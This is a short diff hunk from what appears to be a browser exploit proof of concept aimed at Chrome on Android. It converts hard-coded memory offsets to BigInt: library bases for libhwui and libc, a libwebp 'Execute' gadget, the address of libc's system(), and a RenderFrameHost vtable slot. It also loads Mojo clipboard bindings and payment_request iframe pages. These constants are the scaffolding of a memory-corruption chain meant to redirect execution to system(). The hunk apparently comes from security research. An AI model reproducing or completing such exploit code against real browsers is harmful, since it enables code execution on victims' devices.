@@ -4,16 +4,16 @@
     <script src="third_party/blink/public/mojom/clipboard/clipboard.mojom.js"></script>
     <script>
       //Change these to the actual value before running
-      const libhwuiOffset = 0x7255818000;
-      const libcOffset = 0x72550c7000;
+      const libhwuiOffset = 0x7255818000n;
+      const libcOffset = 0x72550c7000n;
       //Points to Execute in libwebp, offset from libhwui
-      const executeOffset = 0x5DF41C;
-      const bitWriterOffset = 0x63e450;
+      const executeOffset = 0x5DF41Cn;
+      const bitWriterOffset = 0x63e450n;
       //Offset to system in libc
-      const systemOffset = 0x909BC;
+      const systemOffset = 0x909BCn;
  
       //The offset of GetRoutingID in rfh's vtable
-      const getRoutingIDOffset = 0x48;
+      const getRoutingIDOffset = 0x48n;
       const ifrmUrl = 'payment_request_clip2.html';
       const jamUrl = 'payment_request_jam_clip.html';
 
